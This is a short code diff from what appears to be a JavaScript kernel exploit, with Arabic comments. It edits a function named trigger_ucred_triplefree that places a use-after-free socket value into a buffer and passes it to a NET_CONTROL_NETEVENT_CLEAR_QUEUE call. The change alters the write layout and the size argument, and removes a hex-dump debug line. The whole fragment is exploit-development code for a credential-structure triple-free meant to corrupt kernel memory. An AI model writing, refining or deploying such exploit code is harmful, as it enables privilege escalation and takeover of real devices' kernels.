@@ -1513,8 +1513,7 @@ function trigger_ucred_triplefree() {
 
     // قبل الكتابة
     send_notification("[T] before_write32_clear");
-    write32(nc_clear_buf, 0);            // header / reserved
-    write32(nc_clear_buf + 4, uaf_socket);  // actual value
+    write32(nc_clear_buf, uaf_socket);
     send_notification("[T] after_write32_clear");
 
     // قبل nc_call
@@ -1522,8 +1521,8 @@ function trigger_ucred_triplefree() {
     send_notification("[T] nc_clear_buf_ptr=" + nc_clear_buf);
     send_notification("[T] nc_clear_buf_size=32");
     send_notification("[T] clear_queue_value=" + uaf_socket);
-    send_notification("[T] dump=" + hex_dump(nc_clear_buf, 32));
-    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+
+    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 4);
     send_notification("[T] after_nc_call_clear");
 
     // بعد العملية كلها
